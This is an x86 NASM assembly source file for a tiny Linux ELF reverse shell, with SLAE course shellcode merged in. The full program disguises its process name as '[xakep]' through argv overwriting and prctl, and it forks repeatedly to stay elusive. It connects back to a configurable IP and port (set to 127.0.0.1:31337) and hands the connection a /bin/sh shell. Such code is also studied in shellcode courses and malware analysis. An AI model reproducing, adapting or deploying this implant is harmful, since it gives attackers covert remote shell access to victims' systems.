; --------------8<-----------------8<----------------
; Some tiny reverse shell (237 bytes, x86_32)
; assemble: nasm -f bin asm_shell.asm -o asm_shell
;
; ref: https://github.com/arjun024/tiny-elf
;
; GPL-2.0
; author: ksen-lin, 2021

%define HTONL(a, b, c, d) (a + 256*b + 256*256*c + 256*256*256*d)
%define REV_IP   HTONL(0x7f, 0, 0, 1)
%define REV_PORT 0x697a ; == htons(31337)

%define NR_EXIT 1
%define NR_FORK 2
%define NR_NANOSLEEP 0xa2
%define NR_PRCTL 0xac

%define PR_SET_NAME 15


BITS 32
global _start


            org     0x08048000
ehdr:                                               ; Elf32_Ehdr
            db      0x7F, "ELF"                     ;   e_ident
            db      1, 1, 1, 0
BIN_SH:
            db      "/bin/sh", 0
e_type:
            dw      2                               ;   e_type
            dw      3                               ;   e_machine
            dd      1                               ;   e_version
            dd      _start                          ;   e_entry
            dd      phdr - $$                       ;   e_phoff
NEW_ARGV:
            db      "[xakep]", 0                    ; e_shoff, e_flags

            dw      ehdrsize                        ;   e_ehsize
            dw      phdrsize                        ;   e_phentsize
; Elf32_Phdr
phdr:       dd      1                               ;   e_phnum, p_type
            dd      0                               ;   e_shentsize, p_offset

ehdrsize equ     $ - ehdr
            dd      $$                              ;   p_vaddr
            dd      $$                              ;   p_paddr
            dd      filesize                        ;   p_filesz
            dd      filesize                        ;   p_memsz
            dd      5                               ;   p_flags
            dd      0x1000                          ;   p_align

phdrsize equ     $ - phdr


; change argv[0] which shows in ps/top, also PR_SET_NAME
; &argv[0] is in edi
_name:
    push edi
    _len_loop:
        dec ecx     ; for an `infinite' loop
        repne scasb ; find '\0' in argv[0] (ax == 0 as we haven`t touched it yet)

    ; now edi = &argv[0] + strlen(argv[0]) + 1 (points to '\0')
    mov ecx, [esp]  ; now contains &argv[0]
    sub edi, ecx    ; edi = strlen(argv[0])
    xchg ecx, edi   ; edi = &argv[0], ecx = strlen()

    ; fill argv[0] with zeroes. AX == 0
    rep stosb

    ; strncpy(&argv[0], NEW_ARGV, strlen(argv[0] + 1))
    mov edi, [esp]
    mov esi, NEW_ARGV
    push phdr - NEW_ARGV ; strlen(NEW_ARGV) + NULL-byte
    pop ecx
    _name_loop:
        movsb     ; edi[i] = esi[i] ; i+=1
        loop    _name_loop

    ; prctl(PR_SET_NAME, NEW_ARGV)
    push PR_SET_NAME
    push NR_PRCTL
    pop eax
    pop ebx
    mov ecx, NEW_ARGV
    int 0x80

    pop edi
    ret


; is invoked periodically to stay more elusive
_new_pid:
    ;fork()
    push NR_FORK
    pop eax
    int 0x80
    test eax, eax
    jz sleep ; in child

    ;in parent
_exit:
        push NR_EXIT
        pop eax
        ; exit_code = random :D
        int 0x80

    ; sleep(5)
    sleep:
        mov eax, NR_NANOSLEEP
        ; nsec actually dont matter that much, let's skip it
        push dword 5 ; sec
        mov ebx, esp
        xor ecx, ecx
        int 0x80
        pop eax
    ret



; --------------8<-----------------8<----------------
; The code below was originally taken from
; https://github.com/gkweb76/SLAE/blob/c0aef9610a5f75568a0e65c4a91a3bb5a56e6fc6/assignment2/linux_reverse_shell.asm
; and is licensed under MIT
; --------------8<-----------------8<----------------

; The MIT License (MIT)

; Copyright (c) 2015 gkweb76

; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:

; The above copyright notice and this permission notice shall be included in all
; copies or substantial portions of the Software.

; Title: Linux x86 Reverse Shell TCP shellcode (77 bytes)
; Author: Guillaume Kaddouch
; SLAE-681

_start:
    mov edi, [esp + 4]    ; argv[0]
    call _name

    ; Socket creation and handling with socketcall()
    ; socketcall(int call, unsigned long *args)

    ; 1 - creating socket
    ; int socket(int domain, int type, int protocol)
    ; socketfd = socket(2, 1, 0)

    ; eax = 0x66 = socketcall()
    ; ebx = 0x1 = socket()
    ; ecx = ptr to socket's args

    xor ebx, ebx          ; zero out ebx
    mul ebx               ; implicit operand eax: zero out eax
    mov al, 0x66          ; 0x66 = 102 = socketcall()
    push ebx              ; 3rd arg: socket protocol = 0
    inc ebx               ; ebx = 1 = socket() function
    push byte 0x1         ; 2nd arg: socket type = 1 (SOCK_STREAM)
    push byte 0x2         ; 1st arg: socket domain = 2 (AF_INET)
    mov ecx, esp          ; copy stack structure's address to ecx (pointer)
    int 0x80              ; eax = socket(AF_INET, SOCK_STREAM, 0)

    ; 2 - dup2
    ; int dup2(int oldfd, int newfd)
    ; duplicate our socketfd into fd from 2 to 0  (stdin = 0, stdout = 1, stderror = 2)
    ; stdin/stdout/stderror become the TCP connection

    ; eax = 0x3f = dup2()
    ; ebx = socketfd
    ; ecx = fd (from 2 to 0)

    xchg eax, ebx         ; ebx = socketfd, eax = 1
    pop ecx               ; ecx = 2 (loop count)

dup_loop:
    mov al, 0x3f          ; eax = 63 = dup2()
    int 0x80              ; dup2(socketfd, ecx)
    dec ecx               ; decrement ecx from stderror to stdin
    jns dup_loop          ; loop until ZF is set

    ; 3 - connect
    ; int connect(int sockfd, const struct sockaddr *addr[sin_family, sin_port, sin_addr], socklen_t addrlen)
    ; eax = connect(socketfd, [2, port, IP], 16)
    ; returns 0 on success

    ; eax = 0x66 = socketcall()
    ; ebx = 0x3 = connect()
    ; ecx = ptr to bind's args

    push dword REV_IP     ; Remote IP address
                          ; sin_family = 2 (AF_INET)
    push dword 0x0002 + REV_PORT*256*256
    mov ecx, esp          ; ecx = ptr to *addr structure

    push byte 16          ; addr_len = 16 (structure size)
    push ecx              ; push ptr of args structure
    push ebx              ; ebx = socketfd
connect:
    mov al, 0x66          ; 0x66 = 102 = socketcall()
    push 3
    pop ebx               ; ebx = 3 = connect()
    mov ecx, esp          ; save esp into ecx, points to socketfd
    int 0x80              ; eax = connect(socketfd, *addr[2, 7777, IP], 16) = 0 (on success)

    test eax, eax
    jz execve_sh
    call _new_pid
    jmp connect

      ; 4 - execve /bin/sh
    ; execve(const char *filename, char *const argv[filename], char *const envp[])
    ; execve(/bin/sh, &/bin/sh, 0)

    ; eax = 0xb = execve()
    ; ebx = *filename
    ; ecx = *argv
    ; edx = *envp
execve_sh:
    ; eax == 0  since it was test'ed before jumping here
    mov ebx, BIN_SH       ; ebx =  ptr to "/bin/sh" into ebx
    push eax              ; argv[] ends with a nullptr
    push NEW_ARGV
    mov ecx, esp          ; ecx points to shell's argv[0] ( &NEW_ARGV )
    mov al, 0xb
    int 0x80              ; execve /bin/sh

filesize    equ     $ - $$
